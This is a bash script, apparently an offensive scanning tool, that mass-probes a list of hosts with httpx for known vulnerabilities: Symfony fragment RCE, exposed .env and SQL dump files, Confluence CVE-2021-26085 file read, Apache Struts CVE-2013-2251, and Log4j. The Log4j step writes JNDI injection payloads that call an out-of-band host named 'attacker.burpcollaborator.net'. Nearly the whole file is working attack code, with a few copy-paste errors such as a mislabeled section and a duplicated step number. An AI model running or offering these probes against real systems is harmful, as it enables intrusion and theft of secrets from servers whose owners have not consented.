#!/bin/bash

#x0rmanchk.sh hosts.txt
cat << "EOF"
                  I'M WHAT I'M BECAUSE WHAT OF WE ALL ARE.
                    - X0R3R0xF
EOF
sleep 1
### Dirs Preparing..
subdomains=$1
now=$(date)
### End Dirs Preparing


touch cve_results.txt
echo -e "testing date: $now" | tee cve_results.txt
###########################################################################################
######################## Symfony RCE ##########################
###########################################################################################

 printf "

\e[96m##################################################\e[0m
   \e[96mWorking on~ \e[0m \e[31mSymfony RCE\e[0m
\e[96m##################################################\e[0m
"
echo -e "[1] Symfony RCE" >> cve_results.txt
cat $subdomains | xargs -I % -P 25 sh -c 'echo % | httpx -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET -tech-detect -status-code -follow-redirects -title -cl -mc 200 -silent -match-regex "PHP Credits" >> cve_results.txt'
echo -e "---------------------------------------------------------------------" >> cve_results.txt

###########################################################################################
######################## api/.env  ##########################
###########################################################################################


 printf "

\e[96m##################################################\e[0m
   \e[96mWorking on~ \e[0m \e[31m/api/.env\e[0m
\e[96m##################################################\e[0m
"
echo -e "[2] API/.env" >> cve_results.txt
cat $subdomains | xargs -I % -P 25 sh -c 'echo % | httpx -path /api/.env -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -title -silent -cl -match-regex "APP_SECRET"  >> cve_results.txt'
echo -e "---------------------------------------------------------------------" >> cve_results.txt


###########################################################################################
######################## Find File read - CVE-2021-26085 ##########################
###########################################################################################

 printf "

\e[96m##################################################\e[0m
   \e[96m Find File read -  \e[0m \e[31mCVE-2021-26085\e[0m
\e[96m##################################################\e[0m
"


echo -e "[3] Find File read - CVE-2021-26085" >> cve_results.txt
cat $subdomains | xargs -I % -P 25 sh -c 'echo % | httpx -nc -t 300 -p 80,443,8080,8443 -silent -tech-detect -status-code -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -title -mc 200 -cl >> cve_results.txt'
echo -e "---------------------------------------------------------------------" >> cve_results.txt


###########################################################################################
######################## /wp-content\mysql.sql endpoints  ##########################
###########################################################################################

 printf "

\e[96m##################################################\e[0m
   \e[96mWorking on~ \e[0m \e[31m/wp-content\mysql.sql endpoints\e[0m
\e[96m##################################################\e[0m
"
echo -e "[4] wp-content\mysql.sql endpoints" >> cve_results.txt
cat $subdomains | xargs -I % -P 25 sh -c 'echo % | httpx -path "/wp-content/mysql.sql" -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -title -silent -cl -match-regex "APP_SECRET"  >> cve_results.txt'
echo -e "---------------------------------------------------------------------" >> cve_results.txt

###########################################################################################
######################## api/.env  ##########################
###########################################################################################

 printf "

\e[96m##################################################\e[0m
   \e[96mWorking on~ \e[0m \e[31mApache Struts 2 | CVE-2013-2251\e[0m
\e[96m##################################################\e[0m
"
echo -e "[5] Apache Struts 2 | CVE-2013-2251s - " >> cve_results.txt
cat $subdomains | xargs -I % -P 25 sh -c 'echo % | httpx -path "/sm/login/loginpagecontentgrabber.do" -threads 100 -random-agent -x GET,POST,PUT -title -tech-detect -status-code -silent -follow-redirects -mc 200 >> cve_results.txt'
echo -e "---------------------------------------------------------------------" >> cve_results.txt


###########################################################################################
######################## Log4j ##########################
###########################################################################################

 printf "
\e[96m##################################################\e[0m
   \e[96mWorking on ~ \e[0m \e[31mLog4j\e[0m
\e[96m##################################################\e[0m
"
echo -e "[5] Log4j - " >> cve_results.txt
cat $subdomains | sed 's/https?:////' | xargs -I {} echo '{}/${jndi:ldap://{}.attacker.burpcollaborator.net}' >> log4j.txt
httpx -l log4j.txt
echo -e "---------------------------------------------------------------------" >> cve_results.txt
































